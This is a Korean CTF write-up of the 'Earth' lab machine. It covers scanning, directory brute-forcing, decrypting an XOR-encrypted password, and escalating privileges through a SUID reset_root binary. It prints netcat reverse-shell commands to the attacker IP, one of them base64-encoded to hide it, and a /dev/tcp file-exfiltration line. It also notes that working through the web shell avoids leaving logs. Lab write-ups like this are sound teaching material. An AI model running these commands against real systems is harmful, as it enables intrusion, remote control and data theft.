# CTF\_1

***

## Scaning

* <공격대상의 IP를 찾는 방법\_1> `netdiscover -r 192.168.56.0/24`\
  `-r`: 대역 옵션
* <공격대상의 IP를 찾는 방법\_2> `nmap 192.168.56.0/24`<br>
  * 스캔 결과로 출력된 값들 중 원하는 공격 대상 지정 (간단하게 mac주소를 기준으로 지정)<br>
    * "공격 대상의 IP: 192.168.56.103"로 지정
    * ping으로 통신이 원활한지 점검

nmap을 활용한 더 자세한 scaning 옵션 예시:

* `-sV`: 서비스 버전 탐지
* `-v`: 자세한 내용 출력
* `-p`: 포트 지정 (예: `-p 80`)
* `-p-`: 모든 포트 스캔

예시 명령:

```
nmap 192.168.56.103 -sV -v -p-
```

* 무엇으로 점검했는지, 서비스 중인 포트와 서비스의 버전 등을 알 수 있다.
* 알아낸 정보를 바탕으로 서버에 접속한다. (http/https 서비스를 활용해 접근)\
  \
  (ssh 접속도 가능)&#x20;
  * "22/80/443 port 및 서비스 활성화 확인" -> IP 별 소득은 없음

웹 디렉토리 탐색:

* `dirb http://192.168.56.103`
  * 웹 페이지에 생성될 가능성이 있는 모든 디렉토리 이름 대입하여 결과 출력<br>
  * 권한 문제로 접속이 불가능한 것을 확인(결과는 https 도 같았다)<br>
* 웹 페이지에서 상세정보 보기를 통해 추가 정보를 획득\
  \
  https > certification
  * earth.local / terratest.earth.local 서버의 도메인을 찾았다. (하지만 두 도메인으로 접속 불가, DNS가 없기 때문)
    * &#x20;호스트 등록

서비스를 사용해 본다.&#x20;

* 키를 주지 않고 메시지를 보내는 것은 불가능!&#x20;
* 키를 주자 메시지가 추가되었다.
* 내가 작성한 키로 메시지가 암호화 되었다. (서비스의 기능을 알 수 있게되었다.)

도메인 이름을 활용해 dirb 추가 실행:

* `dirb http://earth.local`<br>
* `http://earth.local/admin`으로 접속 가능 확인\
  &#x20;
* `dirb https://terratest.earth.local/`에서 새로운 파일 확인\
  &#x20; \
  [robots.txt](file:///5659318/security/robots.txt.md)
* `/testingnotes.*`가 허용된 것을 확인하고 접속 시도\
  &#x20;
* terra 사용자가 로그인할 때 testdata.txt 파일을 활용해 로그인하고 암호화는 xor 방식이라는 것을 알게됨.
* `https://terratest.earth.local/testdata.txt`<br>
* https://gchq.github.io/CyberChef/ 를 활용해 복호화 시도<br>
  * 암호화에 사용되는 키 값 입력하고 암호화 결과물을 인풋에 입력
* 키로 사용한 문자열: `earthclimatechangebad4humans`
* 찾은 값을 활용해 로그인 시도<br>
* 접속 성공<br>
* `cat /var/earth_web/user_flag.txt`에서 user flag 획득\
  \
  `[user_flag_3353b67d6437f07ba7d34afd7d2fc27d]`

putty로 접속하면 로그가 남으니 웹에서 작업 지속.

netcat 원격 접속을 이용해 명령어 실행 (개요):

* 칼리에서 리버스 리스너 열기:

```
nc -lvnp 4444
```

* 서버에서 칼리로 역접속 유도:

```
nc -e /bin/bash 192.168.56.102 4444
```

(여기서 IP는 공격자 IP)

실행이 바로 되지 않을 때 암호화를 이용:

```
echo 'bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNTYuMTAzIDQ0NDQK' | base64 -d | bash
```

* 쉘 획득 성공<br>

권한 상승 및 루트 획득 흐름 요약:

* 시스템에서 SUID 비트가 설정된 파일 검색:

```
find / -perm -u=s -type f 2>/dev/null
```

* `reset_root` 파일 확인 (실행 불가)
* 공격자(칼리)에서 다른 터미널로 리스너를 열고 파일을 받아옴: 칼리에서:

```
nc -lvnp 3333 > reset_root
```

서버에서:

```
cat /usr/bin/reset_root > /dev/tcp/192.168.56.102/3333
```

* 칼리에서 받은 `reset_root` 파일에 실행 권한 부여:

```
chmod 755 reset_root
```

* `ltrace ./reset_root`로 확인된 3개 파일 생성(세부 내용은 ltrace 결과에 따름)
* 생성된 파일들을 적절한 경로에 touch로 생성 후 `reset_root` 실행 -> 패스워드가 "Earth"로 변경
* `su root`로 전환하여 root 권한 취득
* root 디렉터리로 이동 후 `root_flag.txt` 확인 -> root flag 획득

원문 작업 흐름(요약된 명령 및 로그 예시):

```
kali
nc -lvnp 4444

cli
nc -e /bin/bash kali_ip 4444 -> netcat을 통한 연결 실패

암호화 진행
kali
echo 'nc -e /bin/bash kali_ip 4444' | base64 -> 암호화된 내용 복사

cli
echo '암호화된 내용' | base64 -d | bash -> 칼리에서 연결 확인

kali netcat
whoami
find / -perm -u=s -type f 2>/dev/null -> apache 사용자로 실행할 수 있는 관리자 파일 검색 -> reset_root 파일 확인
file reset_root 및 reset_root 실행 시 안됨

kali 다른 터미널 
nc -lvnp 3333 > reset_root

cli 
cat /usr/bin/reset_root > /dev/tcp/kali_ip/3333 -> 칼리에서 연결 확인(암호화해서 입력하면됨)

kali 터미널에서 reset_root 파일 존재 확인 - cat reset_root -> chmod 755 수정
ltrace ./reset_root -> 3개 파일 확인
netcat에서 3개 파일 생성
touch 경로+파일
reset_root 실행 -> 패스워드가 Earth로 변경
su root -> root로 접속
cd root
ls
root_flag.txt 확인 -> root 사용자의 flag 확인
```

{% stepper %}
{% step %}
### 1. 초기 스캔 및 식별

* netdiscover, nmap으로 네트워크와 서비스 스캔
* 대상 IP: 192.168.56.103
* 열린 포트(22/80/443 등) 확인
{% endstep %}

{% step %}
### 2. 웹 디렉토리 탐색 및 정보수집

* dirb로 디렉토리 브루트포스
* 사이트에서 도메인(earth.local, terratest.earth.local) 확인
* /testingnotes.\*, testdata.txt 등 발견
{% endstep %}

{% step %}
### 3. 복호화 및 인증 우회

* testdata.txt의 암호화 방식(xor) 및 키(earthclimatechangebad4humans) 확인
* CyberChef 등을 사용해 복호화 후 로그인
* user flag 획득
{% endstep %}

{% step %}
### 4. 리버스 셸 확보

* netcat 리스너 설정(kali)
* 서버에서 netcat을 통해 역접속 유도
* 필요 시 명령을 base64로 인코딩/디코딩하여 실행
{% endstep %}

{% step %}
### 5. 파일 전송으로 권한 상승 준비

* SUID 파일(reset\_root) 확인
* /usr/bin/reset\_root 파일을 칼리로 전송하여 분석
* 실행 권한 부여 및 필요한 파일 생성
{% endstep %}

{% step %}
### 6. 권한 상승 및 루트 획득

* reset\_root 실행으로 패스워드 변경(예: Earth)
* su root로 전환하여 root 권한 확보
* root\_flag.txt 확인 및 획득
{% endstep %}
{% endstepper %}

{% hint style="info" %}
putty 등 별도의 SSH 클라이언트를 사용하면 접속 로그가 남을 수 있으므로, 웹 셸을 통해 작업을 지속한 기록이 있습니다.
{% endhint %}
